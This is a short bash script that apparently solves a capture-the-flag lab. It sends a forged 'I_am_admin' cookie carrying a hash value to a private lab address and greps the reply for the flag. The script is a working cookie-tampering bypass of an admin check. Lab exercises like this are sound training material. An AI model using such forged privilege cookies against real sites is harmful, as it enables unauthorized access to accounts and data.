#!/bin/bash

IP="192.168.56.101"

curl -v --cookie "I_am_admin=b326b5062b2f0e69046810717534cb09" http://$IP | grep Flag